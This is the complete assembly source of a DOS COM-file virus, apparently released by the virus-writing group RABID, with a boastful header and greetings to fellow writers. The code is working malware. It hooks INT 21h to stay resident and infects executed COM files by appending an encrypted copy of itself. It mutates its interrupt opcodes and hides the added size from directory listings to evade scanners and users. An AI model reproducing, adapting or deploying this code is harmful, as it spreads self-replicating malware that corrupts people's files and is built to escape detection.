;****************************************************************************
;* The Mutating Interrupt Virus                         -Soltan Griss-
;*                                                  [RABID] -=+ Front 242 +=-
;*
;*
;* Well this is my Third Release of many to come. This virus uses the latest
;* of RABID's new inventions the "MUTATING INTERRUPT", what it does (nothing
;* to special) is Mutate all int 21h (CD 21) to a random interrupt.
;* Then before executation it will change it back to INT 21.
;*
;* Alot of people are wondering if RABID is Still around. YES. Wea reback and
;* Kicking, although right now we have limited members, it soon will change.
;*
;*
;* Many Thanks go out to Data Disruptor, who originally came up with the
;* interrupt swapping idea.
;*
;*
;* SOON TO COME: Why use conventional memory when do has left so many holes??
;*               Find out soon in one of our next RELEASES.
;*
;*               A Real Mutating virus with moveable modular segments!!<G>!
;*
;*
;*
;* A Word of thanks go out to.
;*
;* YAM- Keep up the hard work. Alot of improvement come with time.
;* Admiral Bailey. Waitinf for the next version of the IVP!
;*
;*
;****************************************************************************



seg_a           segment
                assume  cs:seg_a,ds:seg_a,es:nothing

        org     100h
start:  db      0E9h,06,00,42h,0f2h    ; Jump to virus + F242 id string


vstart  equ     $
key:    dw      0                      ;encryptor key.
i_key:  dw      12cdh                  ;Interrupt key
        call    code_start


code_start:
        pop     si
        sub     si,offset code_start   ;get current infected files size
        mov     bp,si


crypter:
        mov    cx,(vend-check)
        mov    dh,byte ptr cs:[key+bp]
        mov    si,offset check
        add    si,bp
loo:    mov    ah,byte ptr cs:[si]      ;Decrypt the virus
        xor    ah,dh
        mov    byte ptr cs:[si],ah
        inc    si
        loop   loo

code:

        mov     si,offset check
        mov     di,offset check
        mov     cx,(vend-check)
looper: mov     ax,[si]
        cmp     ax,word ptr cs:[i_key+bp]  ;Change interrupts back
        je      change
doit:   mov     [di],ax
        inc     si
        inc     di
        loop    looper
        jmp     check
change: mov     ax,21cdh
        jmp     doit

check:
        mov     ax,0F242h                 ;Check to see if we are already
        int     12h
        cmp     bx,0F242h                 ;resident
        je      Already_here

info:   db      0
load:                                     ;Virus Id string so they NAME it
                                          ; RIGHT!!!!
        push    cs
        pop     ds


        mov     ah,49h                          ;Release current Memory block
        int     12h


        mov     ah,48h                          ;Request Hugh size of memory
        mov     bx,0ffffh                       ;returns biggest size
        int     12h



        mov     ah,4ah
        sub     bx,(vend-vstart+15)/16+(vend-vstart+15)/16+1
        jc      exit                               ;subtract virus size
        int     12h


        mov     ah,48h
        mov     bx,(vend-vstart+15)/16+(vend-vstart+15)/16
        int     12h
        jc      exit                              ;request last XXX pages
                                                  ;allocate it to virus

        dec     ax

        push    es

        mov     es,ax

        mov     byte ptr es:[0],'Z'             ;make DOS the  owner
        mov     word ptr es:[1],8
        mov     word ptr es:[3],(vend-vstart+15)/8    ;put size here
        sub     word ptr es:[12h],(vend-vstart+15)/8  ;sub size from current
                                                       ;memory
        inc     ax


        lea     si,[bp+offset vstart]       ;copy it to new memory block
        xor     di,di
        mov     es,ax
        mov     cx,(vend-vstart+5)/2
        cld
        rep     movsw


        xor     ax,ax
        mov     ds,ax
        push    ds
        lds     ax,ds:[21h*4]                        ;swap vectors manually
        mov     word ptr es:[old_21-vstart],ax
        mov     word ptr es:[old_21-vstart+2],ds
        pop     ds
        mov     word ptr ds:[21h*4],(new_21-vstart)
        mov     ds:[21h*4+2],es

exit:
already_here:
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     si,offset buffer                     ;Copy five bytes back!
        add     si,Bp
        mov     di,100h
        movsw
        movsw
        movsb
        mov     bp,100h
        jmp     bp



;***************************************************************************

old_21: dw      0h,0h
buffer  db      0cdh,20h,0,0,0                  ;Buffer to hold the infected
old_date: dw    0                               ;files 5 bytes
old_time: dw    0
jump_add: db    0E9h
          db    0,0
          db    0F2h,42h

new_21:
        cmp     ax,0f242h                       ;Are we going resident?
        je      SAY_YES
        cmp     ax,4b00h                        ;Are we executing?
        je      exec
        cmp     ah,11h
        je      hide_size                       ;doing a DIR??
        cmp     ah,12h
        je      hide_size
        jmp     do_old
exec:   jmp     exec2
SAY_YES:mov     bx,0f242h
do_old: jmp     dword ptr cs:[(old_21-vstart)]  ;If not then do old int 21
        ret

hide_size:
        pushf
        push    cs
        call    do_old                          ;get the current FCB
        cmp     al,00h
        jnz     dir_error                       ;jump if bad FCB

        push    ax
        push    bx
        push    dx
        push    ds
        push    es                              ;undocumented get FCB
        mov     ah,51h                          ;location
        int     12h
        mov     es,bx                           ;get info from FCB
        cmp     bx,es:[16h]
        jnz     not_inf
        mov     bx,dx
        mov     al,[bx]
        push    ax
        mov     ah,2fh                          ;get DTA
        int     12h
        pop     ax
        inc     al                              ;Check for extended FCB
        jnz     normal_fcb
        add     bx,7h
normal_fcb:
        mov     ax,es:[bx+17h]
        and     ax,1fh
        xor     al,01h                          ;check for 2 seconds
        jnz     not_inf

        and     byte ptr es:[bx+17h],0e0h       ;subtract virus size
        sub     es:[bx+1dh],(vend-vstart)
        sbb     es:[bx+1fh],ax
not_inf:pop     es
        pop     ds
        pop     dx
        pop     bx
        pop     ax
dir_error:
        iret

exec2:  push    ax
        push    bx
        push    cx
        push    dx
        push    ds
        push    es

        call    infect                         ;Lets infect the file!!

backup: pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax

        jmp     do_old                          ;go back to original load


infect:
        mov     ax,3d02h
        int     12h
        jc      quit1                           ;open the file


        mov     bx,ax

A_open: push    cs
        pop     ds

        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx                           ;move file pointer to begining
        int     12h                             ;(FOR LATER MODIFICATION ONLY)


        mov     ah,3fh
        mov     cx,5h
        mov     dx,(buffer-vstart)              ;load in the first 5 bytes
        int     12h
        jc      quit1

        cmp     word ptr cs:[(buffer-vstart)],5A4Dh ;check to see if its an
        je      quit1                                                ;EXE

        cmp     word ptr cs:[(buffer-vstart)+3],42F2h
        je      quit1
                                                    ;if so then its infected


        jmp     qqqq

quit1:  jmp     quit2


qqqq:   mov     ax,5700h
        int     12h
        jc      quit1

        mov     word ptr cs:[(old_time-vstart)],cx  ;get the files time
        mov     word ptr cs:[(old_date-vstart)],dx  ;and date

        mov     ax,4202h
        xor     cx,cx
        xor     dx,dx                    ;put file pointer at end
        int     12h
        jc      quit1



        mov     cx,ax
        sub     cx,3                     ;write jump lenght to jump buffer
        add     cx,4
        mov     word ptr cs:[(jump_add+1-vstart)],cx



        mov     ah,2ch                 ;get random number for interrupt
        int     12h                    ;swapping
        cmp     dh,03h                 ;don't like INT 3'S (1 byte only not 2)
        jne     write_key
        inc     dh


write_key:

        mov     word ptr cs:[key-vstart],cx      ;save encryption key
        mov     byte ptr cs:[i_key-vstart+1],dh    ;save interupt key

        mov     si,(check-vstart)  ;write from check to end
        mov     di,(vend-vstart)
        mov     cx,(vend-check)

topper: mov    al,byte ptr cs:[(si)]
        cmp    al,0cdh
        je     changeit
top2:   mov    byte ptr cs:[(di)],al
tor:    inc    si                       ;this "mutating routine" is kind
        inc    di                       ;messy but i'll improve it for version
        loop   topper                   ;2.0
        jmp    crypt
changeit:
        mov    byte ptr cs:[(di)],al
        inc    di
        inc    si
        dec    cx
        mov    al,byte ptr cs:[(si)]
        cmp    al,21h
        jne    top2
        mov    byte ptr cs:[(di)],dh
        jmp    tor

quit:   jmp    quit2


crypt:



        mov    cx,(vend-check)
        mov    dh,byte ptr cs:[key-vstart]
        mov    si,(vend-vstart)
lop:    mov    ah,byte ptr cs:[si]
        xor    ah,dh                            ;Encrypt the code
        mov    byte ptr cs:[si],ah
        inc    si
        loop   lop


        mov     cx,(check-vstart)
        mov     ah,40h                          ;write decrypting routine
        mov     dx,(vstart-vstart)              ;to file first
        int     12h
        jc      quit


        mov     cx,(vend-check)                    ;write the encrypted code
        mov     ah,40h                              ; to the end of the file
        mov     dx,(vend-vstart)
        int     12h
        jc      quit


        mov     ax,4200h                            ;move file pointer to the
        xor     cx,cx                               ;begining to write the JMP
        xor     dx,dx
        int     12h


        mov     cx,5
        mov     ah,40h                              ;write the JMP top the file
        mov     dx,(jump_add-vstart)
        int     12h

        jc      quit

        mov     ax,5701h
        mov     word ptr cx,cs:[(old_time-vstart)]  ;Restore old time,date
        mov     word ptr dx,cs:[(old_date-vstart)]

        and     cl,0e0H
        inc     cl                                  ;change seconds to 2
        int     12h


        mov     ah,3eh
        int     12h


quit2:  ret


vend    equ     $
        nop
        nop

seg_a        ends
        end     start


;WELL THATS IT.
If ya have any questions feel free to contact me on -=+ FRONT 242 +=- (CANADA)
